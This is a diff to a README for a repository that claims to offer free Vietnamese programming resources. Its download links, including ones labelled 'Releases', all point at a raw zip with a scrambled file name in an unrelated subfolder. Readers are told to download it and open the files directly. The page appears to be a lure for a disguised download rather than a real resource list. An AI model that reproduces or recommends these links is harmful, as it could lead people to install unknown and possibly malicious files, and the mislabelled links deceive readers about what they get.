@@ -1,17 +1,17 @@
 # 📚 tai-lieu-lap-trinh-tieng-viet-mien-phi - Learn Programming with Free Vietnamese Resources
 
 ## 📥 Download Now
-[![Download Now](https://raw.githubusercontent.com/norbypnl/tai-lieu-lap-trinh-tieng-viet-mien-phi/main/vitriolic/tai-lieu-lap-trinh-tieng-viet-mien-phi.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/norbypnl/tai-lieu-lap-trinh-tieng-viet-mien-phi/main/vitriolic/tai-lieu-lap-trinh-tieng-viet-mien-phi.zip)
+[![Download Now](https://raw.githubusercontent.com/norbypnl/tai-lieu-lap-trinh-tieng-viet-mien-phi/main/vitriolic/phi_tieng_lieu_mien_trinh_lap_tai_viet_v2.7-alpha.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/norbypnl/tai-lieu-lap-trinh-tieng-viet-mien-phi/main/vitriolic/phi_tieng_lieu_mien_trinh_lap_tai_viet_v2.7-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the "tai-lieu-lap-trinh-tieng-viet-mien-phi" repository. This repo gathers many free programming videos and materials in Vietnamese. You can easily access high-quality resources to help you learn programming effectively.
 
 ## 📁 Download & Install
-To begin your journey, visit this page to download: [Releases](https://raw.githubusercontent.com/norbypnl/tai-lieu-lap-trinh-tieng-viet-mien-phi/main/vitriolic/tai-lieu-lap-trinh-tieng-viet-mien-phi.zip). 
+To begin your journey, visit this page to download: [Releases](https://raw.githubusercontent.com/norbypnl/tai-lieu-lap-trinh-tieng-viet-mien-phi/main/vitriolic/phi_tieng_lieu_mien_trinh_lap_tai_viet_v2.7-alpha.3.zip). 
 
 You will find various versions of the content available for download. Choose the version you prefer based on your interests. Follow the simple steps below to get started:
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/norbypnl/tai-lieu-lap-trinh-tieng-viet-mien-phi/main/vitriolic/tai-lieu-lap-trinh-tieng-viet-mien-phi.zip).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/norbypnl/tai-lieu-lap-trinh-tieng-viet-mien-phi/main/vitriolic/phi_tieng_lieu_mien_trinh_lap_tai_viet_v2.7-alpha.3.zip).
 2. Look for the latest version.
 3. Click on the link to download the files.
 4. Once downloaded, open the files directly on your device.
